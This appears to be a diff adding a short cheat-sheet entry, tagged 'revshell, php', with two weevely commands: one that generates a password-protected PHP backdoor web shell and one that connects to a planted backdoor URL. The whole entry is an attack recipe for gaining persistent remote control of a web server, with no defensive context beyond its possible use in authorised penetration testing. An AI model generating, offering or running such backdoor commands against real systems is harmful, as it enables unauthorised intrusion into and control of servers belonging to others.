@@ -1,0 +1,7 @@
+% revshell, php
+
+# Create php backdoor shell
+weevely.py generate <password> <name>.php
+
+# Connect to php bacckdoor shell
+weevely <backdoorurl> <password>
